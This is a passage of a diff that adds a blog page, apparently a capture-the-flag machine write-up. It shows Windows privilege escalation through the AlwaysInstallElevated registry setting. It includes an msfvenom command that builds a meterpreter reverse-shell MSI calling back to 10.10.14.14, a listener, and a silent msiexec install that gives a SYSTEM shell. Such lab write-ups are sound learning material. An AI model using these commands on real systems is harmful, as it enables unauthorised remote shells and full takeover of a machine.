+<li>then, users of any privilege can install (execute) <code>*.msi</code> files as <code>NT AUTHORITY/SYSTEM</code></li>
+<li>Source
+<ul>
+<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated">HackTricks - windows-local-privilege-escalation</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br>
+<h2 id="checking-the-register">Checking the register</h2>
+<ul>
+<li>Let&rsquo;s try to do it.</li>
+<li>First, let&rsquo;s check the value of the 2 registers</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="register2.png" alt="1"></p>
+<ul>
+<li>So, the value of those <code>2 registers are in facts 0x1</code></li>
+<li>Now, we know we can exploit it.</li>
+</ul>
+<h2 id="generate-msi-files">Generate MSI files</h2>
+<ul>
+<li>So, I&rsquo;m gonna generate <code>MSI package file</code> with <code>msfvenom</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.14 <span class="nv">lport</span><span class="o">=</span><span class="m">9902</span> -f msi &gt; lol.msi
+</span></span></code></pre></div><ul>
+<li>After successfully generate the files</li>
+<li>Then, <code>upload</code> the file into the target machine.</li>
+</ul>
+<h3 id="exploitmultihandler">exploit/multi/handler</h3>
+<ul>
+<li>Before we can execute it.</li>
+<li>We need to set up the <code>&quot;listener&quot;</code> for our meterpreter reverse shell</li>
+</ul>
+<p><img src="multi-handler.png" alt="1"></p>
+<h3 id="execute-the-msi-file">Execute the MSI file</h3>
+<ul>
+<li>Let&rsquo;s execute those files</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msiexec /quiet /qn /i lol.msi
+</span></span><span class="line"><span class="cl"><span class="c1"># flags explain</span>
+</span></span><span class="line"><span class="cl">/quiet <span class="o">=</span> Suppress any messages to the user during installation
+</span></span><span class="line"><span class="cl">/qn <span class="o">=</span> No GUI
+</span></span><span class="line"><span class="cl">/i <span class="o">=</span> Regular <span class="o">(</span>vs.administrative<span class="o">)</span> installation
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="msi-exec.png" alt="1"></p>
+<ul>
+<li>we&rsquo;ve got the shell and become <code>NT AUTHORITY/SYSTEM</code></li>
+</ul>
+<h3 id="administrator-flag">Administrator Flag</h3>
+<p><img src="administrator.png" alt="1"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I&rsquo;ve learned a lot today. First, enumerate is the key. YES! it is important. I always heard SSRF and this machine introduces it to me and guess what. I&rsquo;m so phreaking excited. Also, always ask yourself it is your web app is secure because like we know this machine web app doesn&rsquo;t have any filter at the upload form and it&rsquo;s even allowed php file to be uploaded at the photo upload form. Make sure to configure your machine properly.</p>
+<p>I have a fun time doing this machine and I hope you guys do too. Bye ;)</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/hugo-sid" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 shafiqaiman.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="http://example.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
